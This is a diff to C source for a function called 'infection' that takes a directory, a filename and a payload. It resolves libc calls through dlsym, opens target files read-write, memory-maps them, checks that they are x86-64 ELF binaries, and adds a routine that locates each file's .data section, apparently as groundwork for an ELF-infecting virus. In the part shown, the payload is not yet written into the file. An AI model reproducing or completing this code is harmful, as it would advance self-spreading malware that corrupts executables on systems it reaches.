@@ -9,6 +9,18 @@ static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine)
           e_machine == EM_X86_64);
 }
 
+static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header, int (*strcmp)(const char *, const char *)) {
+  Elf64_Shdr  *pointer;
+  Elf64_Shdr  *shstrHeader;
+  char        dataName[] = ".data";
+
+  pointer = ((void *)header) + header->e_shoff;
+  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
+  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
+    pointer += 1;
+  return (pointer);
+}
+
 int  infection(void *(*dlsym)(void *, const char *), void *handle,
 const char *dirname,  const char *filename, const char *payload) {
   void    *(*malloc)(size_t);
@@ -23,6 +35,7 @@ const char *dirname,  const char *filename, const char *payload) {
   void    (*raise)(int);
   void    *(*mmap)(void *, size_t, int, int, int, off_t);
   int     (*munmap)(void *, size_t);
+  int     (*strcmp)(const char *, const char *);
   char    mallocName[] = "malloc";
   char    strcpyName[] = "strcpy";
   char    strcatName[] = "strcat";
@@ -35,6 +48,7 @@ const char *dirname,  const char *filename, const char *payload) {
   char    munmapName[] = "munmap";
   char    dprintfName[] = "dprintf";
   char    raiseName[] = "raise";
+  char    strcmpName[] = "strcmp";
   char    slash[] = "/";
 
   malloc = dlsym(handle, mallocName);
@@ -49,6 +63,7 @@ const char *dirname,  const char *filename, const char *payload) {
   strlen = dlsym(handle, strlenName);
   dprintf = dlsym(handle, dprintfName);
   raise = dlsym(handle, raiseName);
+  strcmp = dlsym(handle, strcmpName);
 
   int         fd;
   char        *tmp;
@@ -62,7 +77,7 @@ const char *dirname,  const char *filename, const char *payload) {
   strcat(tmp, filename);
   if ((fd = open(tmp, O_RDWR)) == -1) {
     free(tmp);
-    return (-1);
+    return (1);
   }
   free(tmp);
   if (fstat(1, fd, &stats) == -1) {
@@ -77,7 +92,9 @@ const char *dirname,  const char *filename, const char *payload) {
   }
   close(fd);
   if ((size_t)(file.size) < sizeof(Elf64_Ehdr) || !isCompatible(file.header->e_ident, file.header->e_machine))
-    return (-1);
+    return (1);
+  Elf64_Shdr  *data;
+  data = getDataSectionHeader(file.header, strcmp);
   munmap(file.header, file.size);
   return (0);
 }
